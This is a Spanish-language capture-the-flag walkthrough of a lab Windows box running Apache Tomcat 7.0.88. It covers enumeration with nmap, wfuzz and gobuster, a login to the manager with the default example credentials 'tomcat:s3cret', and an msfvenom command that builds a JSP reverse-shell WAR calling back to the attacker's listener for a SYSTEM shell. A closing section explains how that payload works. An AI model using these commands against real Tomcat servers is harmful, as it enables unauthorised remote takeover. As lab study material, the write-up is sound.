ip -> 10.10.10.95 / Windows

Hice un escaneo de puertos:

```console
└─$ nmap -sCV -T5 10.10.10.95 -Pn -v
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1

└─$ whatweb http://10.10.10.95:8080
http://10.10.10.95:8080 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache-Coyote/1.1], IP[10.10.10.95], Title[Apache Tomcat/7.0.88]
```

Apache Tomcat utiliza el lenguaje Java. La version está desactualizada. La pagina es una página por defecto de 
Tomcat. Si es una página por defecto, lo mas logico esque haya subdominios escondidos, aun asi vams a mirar 
primero rutas
```console
└─$ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.95:8080/FUZZ 
000000076:   302        0 L      0 W        0 Ch        "docs"                                               
000000888:   302        0 L      0 W        0 Ch        "examples"                                           
000004875:   302        0 L      0 W        0 Ch        "manager" 
000047442:   200        0 L      0 W        0 Ch        "aux"
└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 -u 10.10.10.95 
```

Tambien es idoneo buscar rutas de manera manual. Filtrando las rutas del codigo fuente, y quitando luego las
que se salgan del scope (o sea sitios web de verdad)
```console
└─$ curl -s GET http://10.10.10.95:8080/ | grep -oE 'href=".*?"' | sed 's/href=//g' | tr -d '"' | sort -u > rutas
└─$ cat rutas | grep -v "http://" | sponge rutas
```
Las rutas de /docs son basicamente un manual de como hacer una web con el Tomcat este.
En manager (el panel de Administracion de Tomcat) nos piden credenciales, busco los por defecto "admin:admin" y no
valen, pero pone en la web:
"For example, to add the manager-gui role to a user named tomcat with a password of s3cret, add the following
to the config file listed above."

O sea, un ejemplo de credenciales por defecto, la cosa esque esas credenciales "tomcat:s3cret" me han servido
para entrar en la web de java Apache Tomcat. En ese panel, te dejan subir un archivo de tipo "war"

Msfvenom tiene una herramienta para crear un war malicioso:
```console
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f war -o shell.war
Saved as: shell.war
```
Una vez subes la *mandanga* esta, /shell se une en la lista de Applications (le das y ya carga)
```
└─$ sudo nc -nlvp 443
(c) 2013 Microsoft Corporation. All rights reserved.
C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```


Las flags están en la ruta de siempre: ```C:\Users\Administrator\Desktop``` en la carpeta *flags*

------------------------------

#### Extra

Vamos a analizar el shell.war que hemos creado con la herramienta del msfvenom. No se apenas java, pero nos crea
dos archivos si unzipeamos el shell.war (WEB-INF con un web.xml dentro muy largo pero que no interesa mucho y
un archivo "bdwslrot.jsp").

1. ¿Que es un war?

Una aplicación Web es un conjunto de codigos HTML, JSP y demas recursos, *empaquetados* en un solo archivo, que 
se puede importar a un servidor web
Consta de el *descriptor de despliegue Web* (un archivo XML con datos como configuraciones y demas y datos
necesarios para que lo corra el lenguaje java)

El **"bdwslrot.jsp"** es el codigo de una web que mezcla java con HTML y XML.
Analizando el codigo, establece una conexion con nuestro sistema y nos ejecuta o /bin/sh o cmd.exe
(Linux o Windows respectivamente), programa buffers para los datos de entrada y de salida de las conexiones (que
se envian por el socket).

Una aplicacion que corra por Apache Tomcat (como la ruta del propio /manager) es un war de estos. Por tanto Tomcat
no deja de ser un conjunto de webs en java,





